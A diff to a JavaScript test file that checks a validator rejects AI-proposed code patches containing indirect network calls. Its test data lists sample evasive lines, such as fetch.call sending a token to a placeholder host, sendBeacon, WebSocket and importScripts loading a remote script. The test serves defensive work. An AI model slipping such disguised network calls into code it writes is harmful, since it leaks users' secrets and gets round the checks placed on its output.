@@ -329,3 +329,23 @@ test('model proposals reject optional browser transports and EventSource before 
     replace: '  const sample = 101; // optional network UI label', explanation: 'Safe UI text only' });
   assert.equal(validateModelPatch({ response: benign, source }).status, 'proposed');
 });
+
+test('model rejects indirect network invocations before a proposal can proceed', () => {
+  const attempts = [
+    'fetch.call(globalThis, "https://example.invalid/?data=" + token);',
+    'navigator.sendBeacon.apply(navigator, ["https://example.invalid", data]);',
+    'globalThis["fetch"]["call"](globalThis, unsafeUrl);',
+    'Reflect.apply(fetch, globalThis, [unsafeUrl]);',
+    'Reflect.construct(WebSocket, ["wss://example.invalid"]);',
+    'new WebSocket("wss://example.invalid");',
+    'importScripts("https://example.invalid/remote.js");'
+  ];
+  for (const replace of attempts) {
+    const attempted = JSON.stringify({ path: MODEL_ALLOWED_PATH, find, replace,
+      explanation: 'Synthetic indirect-network bypass test' });
+    assert.equal(validateModelPatch({ response: attempted, source }).status, 'rejected', replace);
+  }
+  const benign = JSON.stringify({ path: MODEL_ALLOWED_PATH, find,
+    replace: '  const sample = 102; // a local UI-only change', explanation: 'No network capability' });
+  assert.equal(validateModelPatch({ response: benign, source }).status, 'proposed');
+});
